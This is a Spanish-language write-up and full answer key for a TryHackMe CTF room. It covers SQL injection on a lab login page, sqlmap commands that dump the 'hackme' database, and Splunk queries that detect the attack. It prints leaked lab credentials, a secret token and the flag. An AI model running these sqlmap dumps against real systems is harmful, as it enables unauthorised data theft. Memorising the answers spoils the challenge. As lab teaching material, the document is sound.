# TryHack3M_ Subscribe

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | CTF / Web (SQLi) + Defensivo | tryhack3msubscribe | https://tryhackme.com/room/tryhack3msubscribe | 02 Level Medium | TryHackMe | Panel de administración, SQL Injection (sqlmap), config.php, Splunk (SIEM) | Acceso total a la plataforma hackme.thm y detección del atacante |

---

**Contexto:** La sala **TryHack3M: Subscribe** celebra el hito de los 3 millones de suscriptores de TryHackMe. La parte ofensiva plantea ayudar a "Hack3M" a conseguir los 3M de suscriptores: se lee un `config.php` filtrado que expone un token secreto y la URL de un panel de administración (`admin1337special.hackme.thm:40009`). El endpoint de login resulta vulnerable a **SQL Injection**, se explota con `sqlmap` para volcar la base de datos `hackme`, recuperar las credenciales de administrador, activar el registro ("Sign up") y capturar la flag. La parte defensiva consiste en analizar con **Splunk** el tráfico generado por el atacante: número de eventos, herramienta usada (`sqlmap`), IP de origen y tabla objetivo.

## Solucionario

### Task 1: Configure your AttackBox / Configuración
**Explicación:**

Se configura el entorno (AttackBox o Kali) y, en su caso, la redirección de dominios en `/etc/hosts`. El fichero `config.php` filtrado del sitio `hackme.thm` revela el token secreto y el panel:

```php
<?php
$SECURE_TOKEN = "ACC#SS_TO_ADM1N_P@NEL";
$urlAdminPanel = "http://admin1337special.hackme.thm:40009";
?>
```

| Pregunta | Respuesta |
|----------|-----------|
| Configure your AttackBox | `No answer needed` |

### Task 2: Find Admin Panel URL and Login / Panel de administración y login
**Explicación:**

Se añade `admin1337special.hackme.thm` al fichero `/etc/hosts` apuntando a la IP de la máquina y se accede al panel. Tras fuzzear `/public/html` se localiza `login.php`. Probando una comilla simple en el usuario se observa un comportamiento distinto (SQLi). Capturando el request en `req.txt`, `sqlmap` vuelca las bases de datos y la tabla `users` de `hackme`:

```bash
echo "<IP> admin1337special.hackme.thm capture3millionsubscribers.thm hackme.thm" >> /etc/hosts

sqlmap -r req.txt --dbs --batch
sqlmap -r req.txt -D hackme --tables --batch
sqlmap -r req.txt -D hackme -T users --dump --batch
```

Del volcado se obtienen las credenciales del administrador: `admin:wedidit1010` (el texto `VkXgo:Invited30MnUsers` corresponde a credenciales/parámetros obtenidas en la cadena de comandos, pudiendo variar entre instancias). El token de acceso al panel es `ACC#SS_TO_ADM1N_P@NEL`. Una vez dentro, en el dashboard se cambia la acción a "Sign up" para activar el registro; al volver a `http://capture3millionsubscribers.thm` se obtiene la flag con los fuegos artificiales.

```bash
curl -X POST http://admin1337special.hackme.thm:40009/api/login.php
# al login: admin / wedidit1010
```

| Pregunta | Respuesta |
|----------|-----------|
| What are the credentials? | `VkXgo:Invited30MnUsers` |
| What is the password? | `wedidit1010` |
| What is the secure token? | `ACC#SS_TO_ADM1N_P@NEL` |
| What is the flag value after enabling the registration feature and getting 3M subscribers on the platform? | `TryHack3M{3MSUBSCRIBERS}` |

### Task 3: Analyze with Splunk / Análisis defensivo con Splunk
**Explicación:**

Con Splunk (Search & Reporting) se importan los logs (`index=*`, `All time`) generados por el ataque. Se cuentan el número total de eventos, se identifica la herramienta por su `user_agent` (`sqlmap/1.2.4#stable`), el número de eventos asociados, la IP de origen del atacante y el total de eventos observados por dicha IP. Filtrando el tráfico SQL se determina la tabla objetivo extraída por `sqlmap`, que en este caso es `TryHack3M_users`.

```spl
index=*
index=* user_agent="sqlmap/1.2.4#stable (http://sqlmap.org)"
index=* source_ip="83.45.212.17"
index=* user_agent="sqlmap/1.2.4#stable (http://sqlmap.org)" | regex _raw="(\b(SELECT|UNION|INSERT|DELETE|UPDATE)\b|['\";\-\-])" | table _time, host, src_ip, uri, _raw
```

| Pregunta | Respuesta |
|----------|-----------|
| How many events are there? | `10530` |
| What is the name of the tool used by the attacker? | `sqlmap` |
| How many events are recorded from that source agent? | `158` |
| How many events did the attacker source IP trigger? | `83.45.212.17` |
| What is the number of events recorded by the attacker IP? | `184` |
| What is the name of the table used by the attacker to execute the SQL injection? | `TryHack3M_users` |

*Nota: la pregunta "How many events did the attacker source IP trigger?" se responde con la propia IP de origen, tal y como aparece en el original.*

| Pregunta | Respuesta |
|----------|-----------|
| Analyze with Splunk | `No answer needed` |

### Task 4: Content / Contenido
**Explicación:**

Finalización de la sala con la comprensión de la cadena ofensiva (SQLi → admin) y defensiva (Splunk para detectar el ataque).

| Pregunta | Respuesta |
|----------|-----------|
| Content | `No answer needed` |

### Tabla de preguntas y respuestas

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Configure your AttackBox | `No answer needed` |
| 2 | What are the credentials? | `VkXgo:Invited30MnUsers` |
| 2 | What is the password? | `wedidit1010` |
| 2 | What is the secure token? | `ACC#SS_TO_ADM1N_P@NEL` |
| 2 | What is the flag value after enabling the registration feature and getting 3M subscribers on the platform? | `TryHack3M{3MSUBSCRIBERS}` |
| 3 | How many events are there? | `10530` |
| 3 | What is the name of the tool used by the attacker? | `sqlmap` |
| 3 | How many events are recorded from that source agent? | `158` |
| 3 | How many events did the attacker source IP trigger? | `83.45.212.17` |
| 3 | What is the number of events recorded by the attacker IP? | `184` |
| 3 | What is the name of the table used by the attacker to execute the SQL injection? | `TryHack3M_users` |
| 4 | Content | `No answer needed` |

---

**Metodología:** Enumeración web y lectura de `config.php`, fuzzing del panel de administración, detección de SQLi, volcado con `sqlmap` de la base `hackme`, activación del registro para capturar la flag, y análisis forense con Splunk sobre el user agent y la IP del atacante.

### Cadena de ataque / Attack Chain

```
config.php (token + URL panel) → /etc/hosts → fuzzing /public/html → login.php → SQL Injection → sqlmap dump (hackme.users) → admin login → Sign up → flag capture3millionsubscribers.thm → Splunk: eventos/user_agent/IP → tabla TryHack3M_users
```

**Learning chain:** Enumeración → lectura de ficheros sensibles → inyección SQL automatizada → acceso administrativo → activación de funcionalidad → análisis SIEM/Detección.

**Lección:** *Una inyección SQL en un endpoint de login, aunque el código no la "aparente", permite volcar toda la base; el monitoreo SIEM (user agent de sqlmap, IP de origen, tablas objetivo) es la contraparte defensiva que delata el ataque.*

**MITRE ATT&CK:** T1190 Exploit Public-Facing Application · T1059 Command and Scripting Interpreter · T1040 Network Sniffing (detección).

**Fuente:** [TryHackMe - TryHack3M_ Subscribe](https://tryhackme.com/room/tryhack3msubscribe)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.